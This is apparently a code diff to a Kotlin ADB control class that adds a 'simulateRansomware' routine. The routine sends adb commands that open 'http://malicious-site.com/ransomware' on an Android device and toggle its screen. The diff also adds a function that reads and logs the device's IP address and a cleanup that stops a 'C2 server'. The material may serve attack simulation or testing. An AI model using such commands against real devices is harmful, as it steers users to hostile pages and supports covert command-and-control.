@@ -327,4 +327,31 @@ class ADBBase(private val logger: Logger = Logger()) {
 
     suspend fun simulateRansomware() {
         executeAdbBatch(
-            listOf("input keyevent 26", "shell am broadcast -a com.android.systemui.demo --es command enter --es mode ransom --es message
+            listOf(
+                "shell am start -a android.intent.action.VIEW -d 'http://malicious-site.com/ransomware'",
+                "shell input keyevent 26",
+                "shell am broadcast -a android.intent.action.SCREEN_OFF",
+                "shell am broadcast -a android.intent.action.SCREEN_ON",
+                "shell am start -a android.intent.action.VIEW -d 'http://malicious-site.com/ransomware'"
+            ), "Simulating ransomware"
+        )
+    }
+
+    private suspend fun trackIPAddress() {
+        val ipAddress = getDeviceIpAddress()
+        ipAddress?.let {
+            logger.info("Device IP Address: $it")
+        } ?: logger.warning("Could not retrieve device IP address.")
+    }
+
+    private suspend fun getDeviceIpAddress(): String? {
+        val result = executeAdbCommand("shell ip -f inet addr show wlan0", "Getting device IP address")
+        return parseIpAddress(result.output)
+    }
+
+    fun cleanup() {
+        runBlocking {
+            stopC2Server()
+        }
+    }
+}
